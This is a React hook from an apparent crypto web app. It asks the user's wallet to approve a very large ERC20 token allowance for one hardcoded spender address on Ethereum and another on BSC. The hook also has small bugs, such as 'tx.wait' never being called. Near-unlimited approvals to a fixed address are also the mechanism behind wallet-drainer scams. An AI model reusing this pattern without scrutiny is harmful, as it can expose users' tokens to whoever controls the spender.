import { useEffect, useState, useContext } from 'react'

import { getContract, getSigner, toEth } from 'clients/ethereum'
import { BigNumber, Contract, ethers } from 'ethers'
import { AppContext } from 'AppContext'
import { useMoralis, useMoralisCloudFunction } from 'react-moralis'
import { AbiItem } from 'web3-utils'
import tokenContractAbi from 'utils/ERC20.json'

const useGetApproval = (address: string, crypto: string) => {
  const { account } = useContext(AppContext)
  const [contract, setContract] = useState<Contract | null>(null)
  const [isLoading, setIsloading] = useState(true)
  const [underlyingEthBalance, setUnderlyingEthBalance] = useState(0)
  const [underlyingBalance, setUnderlyingBalance] = useState(0)
  const { user, isAuthenticated, web3, Moralis } = useMoralis()

  useEffect(() => {
    const get = async () => {
      setIsloading(true)
      const wallet = await getContract(address)

      if (!wallet) {
        setIsloading(false)

        return
      }

      setContract(wallet)
      setIsloading(false)
    }

    if (!account) {
      setIsloading(false)

      return
    }

    get()
  }, [address, account])

  const approvalGet = async () => {
    setIsloading(true)
    const connector = await Moralis.Web3.enable()
    const chainIdDec = await connector.eth.getChainId()
    const senderAddress = user.get('ethAddress')
    const dex1 = web3.utils.toChecksumAddress(senderAddress)
    const pool = new connector.eth.Contract(tokenContractAbi as AbiItem[], crypto)
    // const value1 = ethers.utils.parseUnits(amount.toString(), 18)
    if (chainIdDec === 1 && address === '0x3E8FFc8c3Cb0DB3081Df85DeC91B63abBbe99F71') {
      console.log('right network')
      const tx = await pool.methods
        .approve(address, '1157920892373161954235709850086879078')
        .send({ from: dex1 })
      await tx.wait
      setIsloading(false)
    } else if (chainIdDec === 56 && address === '0xc56fFEFE53CE0fdf80eE7071d250E86d4819f3Dc') {
      const tx = await pool.methods
        .approve(address, '1157920892373161954235709850086879078')
        .send({ from: dex1 })
      await tx.wait
      setIsloading(false)
    } else {
      alert('Please change your network to ETH Mainnet or BSC Network and try again')
    }
  }

  return {
    isLoading,
    approvalGet,
  }
}

export default useGetApproval
